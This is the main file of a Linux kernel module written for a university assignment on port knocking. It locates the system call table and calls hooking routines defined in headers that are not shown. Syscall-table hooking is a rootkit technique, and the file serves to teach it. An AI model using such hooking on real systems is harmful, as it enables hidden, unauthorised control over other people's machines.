#include <linux/module.h> /* Needed by all modules */
#include <linux/kernel.h> /* Needed for KERN_INFO */
#include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */

#include "hooking.h"
#include "port_knocking.h"

#define DRIVER_AUTHOR "Nicolas Appel, Wenwen Chen"
#define DRIVER_DESC   "Assigment 11 - Port Knocking"

static void ** sct;
static int __init mod_init(void)
{
	sct = syscall_table();
	if(sct != NULL)
	printk(KERN_INFO "syscall table:%016lx\n",(long unsigned int) sct);
	else return 0;

	no_knock();

	return 0;
}

static void __exit mod_exit(void)
{
	if(sct == NULL) return;
	come_in();
}



module_init(mod_init);
module_exit(mod_exit);

MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);
MODULE_LICENSE("GPL");
